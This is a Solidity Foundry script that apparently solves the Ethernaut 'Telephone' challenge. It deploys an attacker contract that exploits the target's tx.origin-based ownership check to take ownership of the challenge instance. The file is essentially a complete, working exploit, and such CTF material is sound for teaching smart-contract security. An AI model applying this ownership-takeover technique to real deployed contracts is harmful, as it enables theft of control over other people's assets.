// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {Telephone} from "../src/04_Telephone.sol";

contract TelephoneAttacker {
	constructor() {}	
	function attack(address _target) external {
		// Telephone(_target).changeOwner(msg.sender);
		// Call the function while passing our original address 
		Telephone(_target).changeOwner(tx.origin);
	}
}

contract TelephoneSolve is Script {
	function run() public {

		vm.startBroadcast();

		// Deploy attacker  
		TelephoneAttacker attacker = new TelephoneAttacker();
		address target = vm.envAddress("INSTANCE_ADDRESS");

		// Perform attack
		console2.log("Original owner", Telephone(target).owner());
		console2.log("exploiting");
		attacker.attack(target);

		// verify
		require(Telephone(target).owner() == msg.sender, "Exploit Failed");
		console2.log("Success! Current owner:", Telephone(target).owner());

		vm.stopBroadcast();
	}
}
